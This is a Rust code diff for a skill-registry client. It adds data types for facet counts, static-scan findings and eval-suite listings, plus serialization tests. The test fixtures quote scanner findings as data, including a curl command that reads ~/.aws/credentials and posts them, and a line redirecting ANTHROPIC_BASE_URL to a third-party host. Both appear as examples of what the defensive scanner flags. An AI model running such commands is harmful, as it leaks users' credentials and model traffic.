@@ -79,6 +79,31 @@ pub struct SkillSummary {
     pub summary: String,
 }
 
+/// One value of one facet, and how many catalog entries carry it.
+#[derive(Debug, Clone, Serialize, Deserialize, Default)]
+pub struct FacetCount {
+    pub value: String,
+    #[serde(default)]
+    pub count: i64,
+}
+
+/// The filter vocabulary the catalog actually has (`GET /skills/facets`), ordered
+/// by count desc. Every `value` is a term [`SearchOptions`](crate::client::SearchOptions)
+/// matches and every `count` is the `total` that filter returns, so a client can
+/// offer these as filter options instead of guessing a list that matches nothing.
+///
+/// `scan_tiers` values are plain strings, not [`ScanTier`]: a tier the client does
+/// not know about yet must show up as an option, not fail the whole response.
+#[derive(Debug, Clone, Serialize, Deserialize, Default)]
+pub struct SkillFacets {
+    #[serde(default)]
+    pub categories: Vec<FacetCount>,
+    #[serde(default)]
+    pub stacks: Vec<FacetCount>,
+    #[serde(default)]
+    pub scan_tiers: Vec<FacetCount>,
+}
+
 /// Paginated search payload.
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
 pub struct SearchResponse {
@@ -101,6 +126,48 @@ pub struct SkillVersion {
     pub signals_score: Option<f64>,
     #[serde(default, skip_serializing_if = "String::is_empty")]
     pub published_at: String,
+}
+
+/// One thing the static scan found, and why it matters.
+///
+/// A tier on its own is not actionable — "medium risk" tells a user to click
+/// through. These carry the matching line so a confirmation prompt can show
+/// exactly what triggered the verdict.
+#[derive(Debug, Clone, Serialize, Deserialize, Default)]
+pub struct ScanFinding {
+    /// Stable rule id, e.g. `credential-exfiltration`, `pipe-to-shell-untrusted`.
+    #[serde(default)]
+    pub rule: String,
+    /// `critical` | `high` | `medium` | `info`. A plain string, not an enum: a
+    /// severity this client does not know yet must render, not fail the response.
+    #[serde(default)]
+    pub severity: String,
+    /// 1-based line in `SKILL.md`; `0` when the finding is about the file itself.
+    #[serde(default)]
+    pub line: i64,
+    /// The matching line, whitespace-collapsed and truncated.
+    #[serde(default, skip_serializing_if = "String::is_empty")]
+    pub excerpt: String,
+    /// Plain-English explanation of the risk, written for the person installing.
+    #[serde(default, skip_serializing_if = "String::is_empty")]
+    pub why: String,
+}
+
+/// The evidence behind [`ScanTier`], served alongside it.
+///
+/// Optional and additive on every response that carries it, so a registry that
+/// has not been re-ingested yet simply omits it.
+#[derive(Debug, Clone, Serialize, Deserialize, Default)]
+pub struct ScanReport {
+    pub tier: ScanTier,
+    #[serde(default)]
+    pub score: f64,
+    /// Which ruleset produced this verdict; lets a client tell a stale tier from
+    /// a current one, and lets tiers be compared across scanner versions.
+    #[serde(default, skip_serializing_if = "String::is_empty")]
+    pub scanner_version: String,
+    #[serde(default)]
+    pub findings: Vec<ScanFinding>,
 }
 
 /// One (tier, cell) rollup shown on a skill page.
@@ -131,6 +198,10 @@ pub struct SkillDetail {
     pub versions: Vec<SkillVersion>,
     #[serde(default)]
     pub eval_cells: Vec<EvalSummaryCell>,
+    /// Why the scan landed where it did. Absent on registries that predate the
+    /// scanner, and omitted for skills with nothing to report.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub scan: Option<ScanReport>,
 }
 
 /// What `install` needs to fetch and verify a skill.
@@ -157,6 +228,10 @@ pub struct ResolveResponse {
     pub tombstoned: bool,
     #[serde(default, skip_serializing_if = "String::is_empty")]
     pub tombstone_reason: String,
+    /// Evidence for `scan_tier`, so an install confirmation can name the exact
+    /// line that made a skill risky instead of saying "unverified".
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub scan: Option<ScanReport>,
 }
 
 // ---- Eval types (used by the runner and `skillrank eval`) ----
@@ -283,6 +358,31 @@ pub struct Suite {
     pub reference_env: ReferenceEnv,
 }
 
+/// One row of the eval-suite index (`GET /eval-suites`). Task bodies are not in
+/// this payload — fetch [`Suite`] once the caller has picked an id.
+#[derive(Debug, Clone, Serialize, Deserialize, Default)]
+pub struct SuiteSummary {
+    pub id: String,
+    pub version: String,
+    #[serde(default, skip_serializing_if = "String::is_empty")]
+    pub title: String,
+    #[serde(default, skip_serializing_if = "String::is_empty")]
+    pub description: String,
+    #[serde(default)]
+    pub task_count: i64,
+    #[serde(default)]
+    pub reference_env: ReferenceEnv,
+}
+
+/// The eval-suite index. Without it a suite id can only be typed from memory.
+#[derive(Debug, Clone, Serialize, Deserialize, Default)]
+pub struct SuiteListResponse {
+    #[serde(default)]
+    pub items: Vec<SuiteSummary>,
+    #[serde(default)]
+    pub total: i64,
+}
+
 /// Returned when a bundle is submitted.
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
 pub struct IngestResponse {
@@ -295,4 +395,109 @@ pub struct IngestResponse {
     pub reason: String,
     #[serde(default)]
     pub conforming: bool,
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// Verbatim `GET /skills/<slug>/resolve` from the running registry. The
+    /// point is the `scan` object: it is new, and an ALREADY-COMPILED client
+    /// must keep parsing responses that carry it.
+    const RESOLVE_WITH_SCAN: &str = r#"{
+      "slug":"nanocoai/add-opencode",
+      "version":"sha256:7451f3c0",
+      "source_type":"github",
+      "source_url":"https://github.com/nanocoai/nanoclaw",
+      "source_subpath":".claude/skills/add-opencode/SKILL.md",
+      "pinned_commit":"0b034342fc19fea2c95da20c2a42b4eaa31f5d84",
+      "content_hash":"sha256:7451f3c0",
+      "scan_tier":"high",
+      "signals_score":63,
+      "raw_content_url":"https://raw.githubusercontent.com/x/y/z/SKILL.md",
+      "tombstoned":false,
+      "scan":{"tier":"high","score":45,"scanner_version":"1.0.0","findings":[
+        {"rule":"model-traffic-relay","severity":"high","line":226,
+         "excerpt":"ANTHROPIC_BASE_URL=https://opencode.ai/zen/v1",
+         "why":"This points ANTHROPIC_BASE_URL at a host that is not the model vendor."}]}
+    }"#;
+
+    #[test]
+    fn resolve_carries_scan_findings() {
+        let r: ResolveResponse = serde_json::from_str(RESOLVE_WITH_SCAN).unwrap();
+        assert_eq!(r.scan_tier, ScanTier::High);
+        assert!(!r.scan_tier.is_safe(), "high must still prompt");
+        let scan = r.scan.expect("scan report should deserialize");
+        assert_eq!(scan.tier, ScanTier::High);
+        assert_eq!(scan.scanner_version, "1.0.0");
+        assert_eq!(scan.findings.len(), 1);
+        assert_eq!(scan.findings[0].rule, "model-traffic-relay");
+        assert_eq!(scan.findings[0].line, 226);
+        assert!(
+            scan.findings[0].why.len() > 20,
+            "a finding must explain itself"
+        );
+    }
+
+    /// A registry that has not been re-ingested yet simply omits `scan`, and an
+    /// unrecognized field must not fail the response either.
+    #[test]
+    fn scan_is_optional_and_unknown_fields_are_ignored() {
+        let older = r#"{"slug":"a/b","version":"v","source_type":"github",
+          "content_hash":"sha256:x","scan_tier":"low","future_field":{"a":1}}"#;
+        let r: ResolveResponse = serde_json::from_str(older).unwrap();
+        assert!(r.scan.is_none());
+        assert!(r.scan_tier.is_safe());
+
+        let detail = r#"{"slug":"a/b","display_name":"B","source_type":"github",
+          "latest_version":"sha256:x","scan_tier":"safe","versions":[],"eval_cells":[]}"#;
+        let d: SkillDetail = serde_json::from_str(detail).unwrap();
+        assert!(d.scan.is_none());
+        assert_eq!(d.summary.scan_tier, ScanTier::Safe);
+    }
+
+    /// Every tier the scanner can emit must round-trip through the enum. A
+    /// mismatch between `registry/lib/scan.mjs` and this list fails the WHOLE
+    /// response, not just one field.
+    #[test]
+    fn every_scan_tier_round_trips() {
+        for (text, tier, safe) in [
+            ("safe", ScanTier::Safe, true),
+            ("low", ScanTier::Low, true),
+            ("medium", ScanTier::Medium, false),
+            ("high", ScanTier::High, false),
+            ("flagged", ScanTier::Flagged, false),
+            ("pending", ScanTier::Pending, false),
+            ("unknown", ScanTier::Unknown, false),
+        ] {
+            let parsed: ScanTier = serde_json::from_str(&format!("\"{text}\"")).unwrap();
+            assert_eq!(parsed, tier);
+            assert_eq!(parsed.is_safe(), safe, "{text} changed prompt behaviour");
+            assert_eq!(
+                serde_json::to_string(&parsed).unwrap(),
+                format!("\"{text}\"")
+            );
+        }
+    }
+
+    /// Serializing a report back out keeps the wire names the registry uses.
+    #[test]
+    fn scan_report_serializes_with_registry_field_names() {
+        let report = ScanReport {
+            tier: ScanTier::Flagged,
+            score: 100.0,
+            scanner_version: "1.0.0".into(),
+            findings: vec![ScanFinding {
+                rule: "credential-exfiltration".into(),
+                severity: "critical".into(),
+                line: 11,
+                excerpt: "curl -d \"$(cat ~/.aws/credentials)\"".into(),
+                why: "This reads credentials and sends them to a fixed host.".into(),
+            }],
+        };
+        let json = serde_json::to_string(&report).unwrap();
+        assert!(json.contains("\"scanner_version\":\"1.0.0\""), "{json}");
+        assert!(json.contains("\"tier\":\"flagged\""), "{json}");
+        assert!(json.contains("\"severity\":\"critical\""), "{json}");
+    }
 }
